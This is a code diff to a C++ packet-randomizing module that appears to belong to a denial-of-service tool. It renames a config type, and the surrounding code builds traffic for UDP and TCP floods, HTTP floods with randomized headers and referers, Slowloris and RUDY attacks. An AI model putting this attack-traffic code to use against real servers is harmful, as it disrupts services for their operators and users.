@@ -44,7 +44,7 @@ namespace Randomizer{
         return vec[randomInt(0, static_cast<int>(vec.size()) -1)];
     }
 
-    static const std::string randomPacket(const config *conf, bool keep_alive=false){
+    static const std::string randomPacket(const Config *conf, bool keep_alive=false){
         std::string packet{};
         std::vector<std::string> encoding{"\'\'", "*", "identity", "gzip", "deflate"};
         std::vector<std::string> caching{"no-cache", "max-age=0"};
@@ -55,10 +55,10 @@ namespace Randomizer{
                                          "https://twitter.com/", "https://www.facebook.com/", "https://www.msn.com/",
                                          "https://www.youtube.com/", "https://yandex.com/", "https://www.amazon.com/"};
         switch(conf->vector){
-            case config::UDPFlood:
-            case config::TCPFlood:
+            case Config::UDPFlood:
+            case Config::TCPFlood:
                 return randomstr();
-            case config::HTTP:{
+            case Config::HTTP:{
                 packet += randomize_Vector(methods) + " /";
                 if(conf->RandomizeHeader){
                     packet += randomstr();
@@ -77,7 +77,7 @@ namespace Randomizer{
                           + "\r\n\r\n";
                 return packet;
             }
-            case config::Slowloris:{
+            case Config::Slowloris:{
                 if(keep_alive){
                     packet += "X-a: "
                               + std::to_string(randomInt(1, 5000))
@@ -102,7 +102,7 @@ namespace Randomizer{
                 }
                 return packet;
             }
-            case config::Rudy:{
+            case Config::Rudy:{
                 if(keep_alive){
                     packet += randomstr();
                 }else{
